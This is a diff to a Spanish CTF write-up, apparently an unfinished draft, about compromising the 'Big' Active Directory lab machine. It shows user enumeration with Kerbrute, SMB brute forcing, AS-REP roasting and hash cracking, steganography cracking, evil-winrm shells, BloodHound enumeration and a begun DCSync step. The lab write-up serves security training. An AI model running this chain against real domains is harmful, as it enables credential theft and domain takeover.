@@ -14,6 +14,18 @@ categories:
 tags:
   - Windows
   - Active Directory
+  - Kerberos
+  - SMB
+  - WinRM
+  - Web Enumeration
+  - Fuzzing
+  - Brute Force Attack
+  - Kerberos Enumeration
+  - AS-REP Roasting Attack
+  - Cracking Hash
+  - Steganalysis
+  - 
+  - 
   - 
   - 
   - 
@@ -34,8 +46,25 @@ Herramientas utilizadas:
 * *wappalizer*
 * *wfuzz*
 * *gobuster*
-* **
-* **
+* *kerbrute_linux_amd64*
+* *wget*
+* *file*
+* *strings*
+* *head*
+* *exiftool*
+* *crackmapexec*
+* *evil-winrm*
+* *impacket-GetNPUsers*
+* *JohnTheRipper*
+* *hashcat*
+* *apt*
+* *steghide*
+* *stegcracker*
+* *stegseek*
+* *grep*
+* *md5sum*
+* *awk*
+* *echo*
 * **
 * **
 * **
@@ -66,20 +95,20 @@ Herramientas utilizadas:
 				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
 				<li><a href="#fuzz">Fuzzing</a></li>
 				<li><a href="#directorios">Analizando Directorios Web Encontrados</a></li>
-				<li><a href="#Kerbrute">Enumeración de Usuarios con Kerbrute</a></li>
+				<li><a href="#Kerbrute">Enumeración de Usuarios del Servicio Kerberos con Kerbrute</a></li>
 				<li><a href="#ImagenesBig">Analizando Imágenes Encontradas en Directorio</a></li>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
 				<li><a href="#FuerzaBruta">Aplicando Fuerza Bruta a Servicio SMB</a></li>
 				<li><a href="#AS-REP">Aplicando AS-REP Roasting Attack</a></li>
-				<li><a href="#Extracción">Extrayendo Archivo Oculto de una Imagen</a></li>
+				<li><a href="#Estegoanalisis">Extrayendo Archivo Oculto de una Imagen Aplicando Estegoanálisis</a></li>
 				<ul>
-					<li><a href="#wordlists">Creando Wordlist con las Letras de Canciones Encontradas Convirtiendo Oraciones en Hash MD5</a></li>
+					<li><a href="#wordlists">Creando Wordlist con las Letras de Canciones Encontradas Convirtiendo las Oraciones en Hashes MD5</a></li>
 					<li><a href="#stegcracker">Crackeando Imágenes con stegcracker</a></li>
 					<li><a href="#stageseek">Crackeando Imágenes con stegseek</a></li>
 				</ul>
-				<li><a href="#ComprobandoContraseña">Obteniendo Archivo Original con steghide y Aplicando Password Spraying con Nueva Contraseña</a></li>
+				<li><a href="#ComprobandoPass">Obteniendo Archivo Original con steghide y Aplicando Password Spraying con Nueva Contraseña</a></li>
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
@@ -312,11 +341,11 @@ Nmap done: 1 IP address (1 host up) scanned in 69.72 seconds
 
 Muy bien, tenemos bastante información.
 
-Para empezar, el **servicio LDAP** nos dio el dominio que esta ocupando el **AD**, siendo **bbr.thl**. Registralo en el `/etc/hosts`.
+Para empezar, el **servicio LDAP** nos dio el dominio que está ocupando el **AD**, siendo **bbr.thl**. Regístralo en el `/etc/hosts`.
 
 Vemos que tiene una página web activa en el **puerto 80**, y también parece estar activo el **servicio WinRM** en el **puerto 5985**.
 
-Y por último, parece que el **servicio SMB** necesita credenciales validas para poder listar los recursos compartidos.
+Y por último, parece que el **servicio SMB** necesita credenciales válidas para poder listar los recursos compartidos.
 
 Con todo esto visto, vamos a empezar por la página web y luego por el **servicio Kerberos**.
 
@@ -438,7 +467,7 @@ Encontramos 3 directorios con ambas herramientas. Investiguemos que contienen.
 
 <h2 id="directorios">Analizando Directorios Web Encontrados</h2>
 
-Si entramos en el directorio `/images`, solo encontraremos 4 imagenes y un archivo web.config que no contiene nada:
+Si entramos en el directorio `/images`, solo encontraremos 4 imágenes y un archivo **web.config** que no contiene nada:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-big/Captura4.png">
@@ -464,7 +493,7 @@ Nos están dando una pista, ya que el mensaje menciona que se escondieron llaves
 
 <br>
 
-Si entramos en el directorio `/songs`, encontraremos varios archivos de texto que parecen ser canciones:
+Si entramos en el directorio `/songs`, encontraremos varios archivos de texto que parecen ser letras de canciones:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-big/Captura7.png">
@@ -482,10 +511,9 @@ Por ahora, ya tenemos algunas pistas sobre lo que podemos hacer para avanzar con
 
 <br>
 
-<h2 id="Kerbrute">Enumeración de Usuarios con Kerbrute</h2>
+<h2 id="Kerbrute">Enumeración de Usuarios del Servicio Kerbrute con Kerbrute</h2>
 
-Por ahora, tenemos al menos un usuario posible que encontramos en el directorio `/contents`. Podría ser que otro usuario sea **big**, ya que el escaneo de servicios menciona que es el nombre de la máquina.
-Además, encontramos muchas referencias a este artista, así que es muy probable que sea otro usuario.
+Por ahora, tenemos al menos un usuario posible que encontramos en el directorio `/contents`. Podría ser que otro usuario sea **big**, ya que el escaneo de servicios menciona que es el nombre de la máquina. Además, encontramos muchas referencias a este artista, así que es muy probable que sea otro usuario.
 
 Vamos a comprobar si estamos en lo correcto utilizando la herramienta **Kerbrute**.
 
@@ -538,13 +566,13 @@ Version: v1.0.3 (9dad6e1) - 04/17/25 - Ronnie Flathers @ropnop
 2025/04/17 13:09:29 >  [+] VALID USERNAME:	 Big@bbr.thl
 2025/04/17 13:11:28 >  [+] VALID USERNAME:	 Song@bbr.thl
 ```
-El escaneo duro un rato, pero solamente encontro estos usuarios que solamente agrega al **usuario song y administrator**.
+El escaneo duro un rato, pero solamente encontró estos usuarios que solamente agrega al **usuario song y administrator**.
 
 <br>
 
 <h2 id="ImagenesBig">Analizando Imagenes Encontradas en Directorio</h2>
 
-De acuerdo al mensaje que encontramos en el directorio `/content`, puede que alguna imagen contenga un hash MD5 oculto.
+De acuerdo al mensaje que encontramos en el directorio `/content`, puede que alguna imagen contenga un **hash MD5** oculto.
 
 Vamos a descargar las imágenes y luego vamos a analizar cada una para ver que podemos encontrar.
 
@@ -581,9 +609,9 @@ Descargados: 6 ficheros, 649K en 0.06s (10.6 MB/s)
 Listo, ya las tenemos todas.
 
 Para el análisis, utilizaremos las siguientes herramientas:
-* file
-* strings
-* exiftool
+* *file*
+* *strings*
+* *exiftool*
 
 Veamos qué nos muestra **file**:
 ```bash
@@ -601,7 +629,6 @@ big4.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segmen
 ```
 Parecen ser imágenes simples.
 
-
 Lo curioso empieza cuando vemos las imágenes con **strings**, pues con **big2.jpg** parece que muestra un hash:
 ```bash
 strings big2.jpg | head -n 10
@@ -616,14 +643,14 @@ $3br
 &'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
 <JYC6
 ```
-Pero no resulta ser nada.
+Pero no resulta ser algo útil.
 
 Y con **exiftool** tampoco muestra algo.
 
-Investigando un poco sobre **"como encontrar data oculta en imágenes"**, encontre el siguiente blog:
+Investigando un poco sobre **"como encontrar data oculta en imágenes"**, encontré el siguiente blog:
 * <a href="https://infosecwriteups.com/beginners-ctf-guide-finding-hidden-data-in-images-e3be9e34ae0d" target="_blank">Beginners CTF Guide: Finding Hidden Data in Images</a>
 
-Al final menciona sobre el tema de **Estenografía**. Investiguemos que es esto.
+Al final menciona sobre el tema de **Estenografía**. Investiguemos que es esto:
 
 | **Estenografía** |
 |:-----------:|
@@ -633,7 +660,7 @@ Al final menciona sobre el tema de **Estenografía**. Investiguemos que es esto.
 
 Además, menciona unas herramientas que podemos utilizar, pero esas herramientas no nos ayudaran, ya que están obsoletas, así que de momento, pasemos a revisar otras cosas.
 
-Recordando que tenemos usuarios validos y un wordlist de contraseña que encontramos en la página web, podemos aplicar **Fuerza Bruta** y quizá el **ASREP-Roasting Attack**.
+Recordando que tenemos usuarios válidos y un wordlist de contraseña que encontramos en la página web, podemos aplicar **Fuerza Bruta** y quizá el **ASREP-Roasting Attack**.
 
 
 <br>
@@ -645,9 +672,9 @@ Recordando que tenemos usuarios validos y un wordlist de contraseña que encontr
 <br>
 
 
-<h2 id="FuerzaBruta">Aplicando Fuerza Bruta a Servicio Kerberos</h2>
+<h2 id="FuerzaBruta">Aplicando Fuerza Bruta a Servicio SMB</h2>
 
-Vamos a descargar el wordlist de contraseñas que esta en la página web con **wget**:
+Vamos a descargar el wordlist de contraseñas que está en la página web con **wget**:
 ```bash
 wget http://192.168.212.4/songs/Skyisthelimit.txt
 --2025-04-17 12:50:50--  http://192.168.212.4/songs/Skyisthelimit.txt
@@ -661,23 +688,23 @@ Skyisthelimit.txt      100%[=================>]   1.75K  --.-KB/s    en 0s
 2025-04-17 12:50:51 (225 MB/s) - «Skyisthelimit.txt» guardado [1793/1793]
 ```
 
-Y con **crackmapexec**, vamos a aplicar fuerza bruta al **servicio SMB** y utilizaremos un pequeño filtro para que nos muestre los resultados validos:
+Y con **crackmapexec**, vamos a aplicar fuerza bruta al **servicio SMB** y utilizaremos un pequeño filtro para que nos muestre los resultados válidos:
 ```bash
 crackmapexec smb 192.168.212.4 -u usuarios.txt -p Skyisthelimit.txt --continue-on-success | grep "[+]"
 SMB                      192.168.212.4   445    BIG              [+] bbr.thl\song:******
 ```
 
-Muy bien, tenemos la contraseña del **usuario song** y si recordamos el escaneo de servicios, esta activo el **servicio WinRM**, por lo que podemos probar si estas credenciales sirven para ese servicio:
+Muy bien, tenemos la contraseña del **usuario song** y si recordamos el escaneo de servicios, está activo el **servicio WinRM**, por lo que podemos probar si estas credenciales sirven para ese servicio:
 ```bash
 crackmapexec winrm 192.168.212.4 -u 'song' -p '******'
 SMB         192.168.212.4   5985   BIG              [*] Windows 10 / Server 2016 Build 14393 (name:BIG) (domain:bbr.thl)
 HTTP        192.168.212.4   5985   BIG              [*] http://192.168.212.4:5985/wsman
 WINRM       192.168.212.4   5985   BIG              [+] bbr.thl\song:****** (Pwn3d!)
 ```
-Excelente, podemos conectarnos a la máquina víctima con **evil-winrm**.
+Excelente, podemos conectarnos a la máquina víctima con la herramienta **evil-winrm**.
 
 Hagámoslo:
-```bash
+```batch
 evil-winrm -i 192.168.212.4 -u 'song' -p '******'
                                         
 Evil-WinRM shell v3.7
@@ -690,13 +717,13 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\TEMP\Documents> whoami
 bbr\song
 ```
-Estamos dentro.
+Estamos dentro, pero este usuario no tiene la flag.
 
 <br>
 
 <h2 id="AS-REP">Aplicando AS-REP Roasting Attack</h2>
 
-Como ya tenemos una lista de usuarios validos, podemos aplicar el **AS-REP Roasting Attack**, con tal de confirmar si algún usuario tiene la flag **UF_DONT_REQUIRE_PREAUTH** y así capturar el **hash krb5asrep** que contiene la contraseña del usuario con esta flag.
+Como ya tenemos una lista de usuarios válidos, podemos aplicar el **AS-REP Roasting Attack**, con tal de confirmar si algún usuario tiene la flag **UF_DONT_REQUIRE_PREAUTH** y así capturar el **hash krb5asrep** que contiene la contraseña del usuario con esta flag.
 
 Lo haremos con la herramienta **impacket-GetNPUsers**:
 ```bash
@@ -759,11 +786,19 @@ Hardware.Mon.#1..: Util:  3%
 Started: Thu Apr 17 16:06:37 2025
 Stopped: Thu Apr 17 16:06:53 2025
 ```
-Obtuvimos la contraseña y es la misma que encontramos en el ataque de fuerza bruta.
+Obtuvimos la contraseña y es la misma que encontramos en el **ataque de fuerza bruta**.
 
 <br>
 
-<h2 id="Extracción">Extrayendo Archivo Oculto de una Imagen</h2>
+<h2 id="Estegoanalisis">Extrayendo Archivo Oculto de una Imagen Aplicando Estegoanálisis</h2>
+
+¿Qué es **Steganalysis/Estegonálisis**?
+
+| **Steganalysis/Estegonálisis** |
+|:-----------:|
+| *El estegoanálisis es la disciplina que se encarga de detectar, analizar y, en algunos casos, extraer información oculta dentro de archivos (como imágenes, audio o video) que han sido modificados utilizando técnicas de esteganografía. Mientras que la esteganografía se enfoca en ocultar información de forma encubierta, el estegoanálisis tiene el objetivo opuesto: descubrir si existe algo oculto y tratar de revelar su contenido.* |
+
+<br>
 
 Para poder hacer esto, podemos ocupar las siguientes herramientas:
 * *steghide*
@@ -787,11 +822,11 @@ Nos pide un **salvoconducto**, que en realidad es una contraseña.
 
 Pero como no tenemos una contraseña, ¿qué podemos probar? Recordemos que hay una **clave oculta en MD5**, y recordando que más tenemos, están los archivos de texto que son letras de canciones dentro del directorio `/songs`.
 
-Vamos a copiar todos esos archivos de texto, saquemos las oraciones y luego transformemoslas en **hashes MD5**.
+Vamos a copiar todos esos archivos de texto, saquemos las oraciones y luego transformémoslas en **hashes MD5**.
 
 <br>
 
-<h3 id="wordlists">Creando Wordlist de Canciones para Convertir Oraciones en Hash MD5</h3>
+<h3 id="wordlists">Creando Wordlist con las Letras de Canciones Encontradas Convirtiendo las Oraciones en Hashes MD5</h3>
 
 Primero, descarguemos los archivos de texto:
 ```bash
@@ -831,7 +866,7 @@ Lo puedes crear de esta manera:
 echo -n "It was all a dream" | md5sum | awk '{print $1}'
 99ae77c0c0faf78b872f9f452e3eaa241
 ```
-Ya solo agregalos al final o donde quieras del wordlist.
+Ya solo agrégalos al final o donde quieras del wordlist.
 
 <br>
 
@@ -858,14 +893,14 @@ Tried 437 passwords
 Your file has been written to: big2.jpg.out
 99ae77c0c0faf78b872f9f452e3eaa24
 ```
-Excelente, se pudo crackear y obtuvimos un archivo llamado **big2.jpg.out**. Además, nos muestra el hash MD5 que sirvio para crackear la imagen, siendo que es de la misma frase **"It was all a dream"** que sacamos del código fuente de la página web.
+Excelente, se pudo crackear y obtuvimos un archivo llamado **big2.jpg.out**. Además, nos muestra el **hash MD5** que sirvió para crackear la imagen, siendo que es de la misma frase **"It was all a dream"** que sacamos del código fuente de la página web.
 
 Vamos a leer ese archivo:
 ```bash
 cat big2.jpg.out
 ...
 ```
-Parece ser una contraseña. La comprobamos más adelante.
+Parece ser una contraseña. La comprobaremos más adelante.
 
 <br>
 
@@ -875,8 +910,9 @@ Vamos a instalar la herramienta **stegseek**:
 ```bash
 apt install stegseek
 ```
+Ya sabemos qué imagen debemos usar, siendo la imagen **big2.jpg**.
 
-Bien, tenemos que indicarle que vamos a crackear la imagen (**--crack**), la ubicación de la imagen, el wordlist a usar y donde se guardara el resultado:
+Bien, tenemos que indicarle que vamos a crackear (**--crack**) una imagen, la ubicación de la imagen, el wordlist a usar y donde se guardara el resultado:
 ```bash
 stegseek --crack big2.jpg canciones/hashes.txt resultado.txt
 StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
@@ -896,7 +932,7 @@ La misma contraseña.
 
 <br>
 
-<h2 id="ComprobandoContraseña">Obteniendo Archivo Original con steghide y Aplicando Password Spraying con Nueva Contraseña</h2>
+<h2 id="ComprobandoPass">Obteniendo Archivo Original con steghide y Aplicando Password Spraying con Nueva Contraseña</h2>
 
 Probemos que pasa si usamos **steghide** y el **hash MD5** que resulto ser el correcto:
 ```bash
@@ -938,16 +974,41 @@ SMB         192.168.212.4   5985   BIG              [*] Windows 10 / Server 2016
 HTTP        192.168.212.4   5985   BIG              [*] http://192.168.212.4:5985/wsman
 WINRM       192.168.212.4   5985   BIG              [+] bbr.thl\music:****** (Pwn3d!)
 ```
-Si sirve.
+Sí sirve.
 
 Vamos a autenticarnos con este usuario:
-```bash
-
+```batch
+evil-winrm -i 192.168.212.4 -u 'music' -p '******'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\TEMP\Documents> whoami
+bbr\music
 ```
 Estamos dentro.
 
-Con esto hecho, ya tenemos la contraseña de 2 usuarios.
+Y curiosamente, este usuario sí tiene la flag:
+```batch
+*Evil-WinRM* PS C:\Users\TEMP\Documents> cd C:\Users\Music\Documents
+*Evil-WinRM* PS C:\Users\Music\Documents> dir
 
+
+    Directory: C:\Users\Music\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        4/30/2024  12:53 AM             32 user.txt
+
+*Evil-WinRM* PS C:\Users\Music\Documents> type user.txt
+...
+```
+Con esto hecho, ya tenemos la contraseña de 2 usuarios.
 
 
 <br>
@@ -959,27 +1020,164 @@ Con esto hecho, ya tenemos la contraseña de 2 usuarios.
 <br>
 
 
-<h2 id=""></h2>
+<h2 id="BloodHound">Enumeración de AD con BloodHound y SharpHound</h2>
 
-```bash
+Analizando ambos usuarios, parece que el **usuario song** tiene más privilegios que el **usuario music**.
 
+Observa los privilegios del **usuario song**
+```batch
+*Evil-WinRM* PS C:\Users\TEMP.bbr\Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                         State
+============================= =================================== =======
+SeMachineAccountPrivilege     Add workstations to domain          Enabled
+SeSystemtimePrivilege         Change the system time              Enabled
+SeBackupPrivilege             Back up files and directories       Enabled
+SeRestorePrivilege            Restore files and directories       Enabled
+SeShutdownPrivilege           Shut down the system                Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
+SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
+SeTimeZonePrivilege           Change the time zone                Enabled
 ```
 
-```bash
+Comparalo con el **usuario music**:
+```batch
+*Evil-WinRM* PS C:\Users\Music\Documents> whoami /priv
 
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 ```
 
-```bash
+Y parece que los grupos a los que pertenece el **usuario song** tienen más privilegios:
+```batch
+*Evil-WinRM* PS C:\Users\TEMP.bbr\Documents> whoami /groups
 
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                           Attributes
+========================================== ================ ============================================= ==================================================
+Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Account Operators                  Alias            S-1-5-32-548                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Server Operators                   Alias            S-1-5-32-549                                  Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+bbr\Privilege users                        Group            S-1-5-21-1487034055-435569681-4283575489-1107 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288
 ```
+Me llama mucho la atención que este usuario este en el grupo **Account Operatons y Privilige Users**.
+
+EXPLICACION DE ESTOS GRUPOS
+
+Para esta máquina, utilizaremos **BloodHound Community Edition y SharpHound v1.1.1**.
+
+Este blog enseña como instalar **BloodHound Community Edition** y como usarlo:
+* <a href="https://m4lwhere.medium.com/the-ultimate-guide-for-bloodhound-community-edition-bhce-80b574595acf" target="_blank">The Ultimate Guide for BloodHound Community Edition (BHCE)</a>
+
+Y de aquí puedes conseguir **SharpHound v1.1.1**:
+* <a href="https://github.com/SpecterOps/SharpHound/releases/tag/v1.1.1" target="_blank">Repositorio de SpecterOps: SharpHound v1.1.1</a>
+
+Carguémos **SharpHound** a la sesión de **evil-winrm** del **usuario song** y trabajemos con este usuario de ahora en adelante:
+```batch
+*Evil-WinRM* PS C:\Users\Music\Desktop> upload SharpHoundV1.exe
+Info: Uploading /../TheHackersLabs/Big/content/sharphoundV1.1.1/SharpHoundV1.exe to C:\Users\Music\Desktop\SharpHoundV1.exe
+Data: 1402880 bytes of 1402880 bytes copied
+Info: Upload successful!
+```
+
+Bien, ahora usemoslo y descarguemos el **archivo ZIP** resultante:
+```batch
+*Evil-WinRM* PS C:\Users\Music\Desktop> .\SharpHoundV1.exe -c All
+2025-04-17T21:49:39.2957598-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
+...
+...
+Closing writers
+2025-04-17T21:50:28.4673290-07:00|INFORMATION|Status: 96 objects finished (+96 2)/s -- Using 42 MB RAM
+2025-04-17T21:50:28.4673290-07:00|INFORMATION|Enumeration finished in 00:00:48.7349869
+2025-04-17T21:50:28.5299496-07:00|INFORMATION|Saving cache with stats: 56 ID to type mappings.
+ 56 name to SID mappings.
+ 0 machine sid mappings.
+ 2 sid to domain mappings.
+ 0 global catalog mappings.
+2025-04-17T21:50:28.5299496-07:00|INFORMATION|SharpHound Enumeration Completed at 9:50 PM on 4/17/2025! Happy Graphing!
+.
+*Evil-WinRM* PS C:\Users\Music\Desktop> download 20250417215027_BloodHound.zip
+Info: Downloading C:\Users\Music\Desktop\20250417215027_BloodHound.zip to 20250417215027_BloodHound.zip                                       
+Info: Download successful!
+```
+
+Ya podemos cargar este archivo al **BloodHound** y lo primero que haremos será buscar al **usuario song** (no olvides marcarlo como **owned**):
+
+<p align="center">
+<img src="/assets/images/THL-writeup-big/Captura9.png">
+</p>
+
+Podemos ver más claramente a los grupos que pertenece, y ahí vemos al grupo **Account Operators**.
+
+Además, observa que buscando las cuentas que sean vulnerables al **AS-REP Roasting Attack**, sale este usuario:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-big/Captura10.png">
+</p>
+
+Analizando un poco más, observa lo que podemos ver en las rutas cortas a los sistemas de confianza para la delegación sin restricciones:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-big/Captura11.png">
+</p>
+
+Parece que tenemos el **permiso GenericAll** para el **grupo Special Permissions**.
+
+EXPLICACIÓN DE GRUPO SPECIAL PERMISSION
+
+Viendo las rutas cortas para los administradores de dominio, vemos que el **grupo Special Permissions**, tiene el **permiso de modificar el DACL** del **contenedor USERS**, que a su vez se relaciona con el dominio completo:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-big/Captura12.png">
+</p>
+
+Esto ya nos da una idea de que puede ser vulnerable.
+
+Para terminar, si vemos las rutas cortas de los objetos propios, encontramos que el **grupo Special Permissions** tiene el **permiso de modificar el DACL**, lo que nos permitiría aplicar el **DCSync Attack**:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-big/Captura13.png">
+</p>
+
+<p align="center">
+<img src="/assets/images/THL-writeup-big/Captura14.png">
+</p>
 
 <br>
 
-<h2 id=""></h2>
+<h2 id="">Aplicando DCSync Attack con PowerView</h2>
+
+
+* <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" target="_blank">Repositorio de PowerShellMafia: PowerView.ps1</a>
+
 
 ```bash
-
+*Evil-WinRM* PS C:\Users\song\Desktop> upload PowerView.ps1
+Info: Uploading /home/berserkwings/Escritorio/TheHackersLabs/Big/content/post/PowerView.ps1 to C:\Users\song\Desktop\PowerView.ps1
+Data: 1027036 bytes of 1027036 bytes copied
+Info: Upload successful!
 ```
+
 
 ```bash
 
@@ -1014,10 +1212,20 @@ Con esto hecho, ya tenemos la contraseña de 2 usuarios.
 </div>
 
 
-links
+* https://infosecwriteups.com/beginners-ctf-guide-finding-hidden-data-in-images-e3be9e34ae0d
+* https://github.com/zed-0xff/zsteg
+* https://latam.kaspersky.com/resource-center/definitions/what-is-steganography
+* https://www.kali.org/tools/stegcracker/
+* https://www.reddit.com/r/computerforensics/comments/be92z5/is_there_any_tool_to_identify_steganography/
+* https://github.com/bannsec/stegoveritas
+* https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
+* https://github.com/SpecterOps/SharpHound/releases/tag/v1.1.1
+* https://m4lwhere.medium.com/the-ultimate-guide-for-bloodhound-community-edition-bhce-80b574595acf
+* https://nordvpn.com/cybersecurity/glossary/steganalysis/
 
 
 <br>
+
 # FIN
 
 <footer id="myFooter">
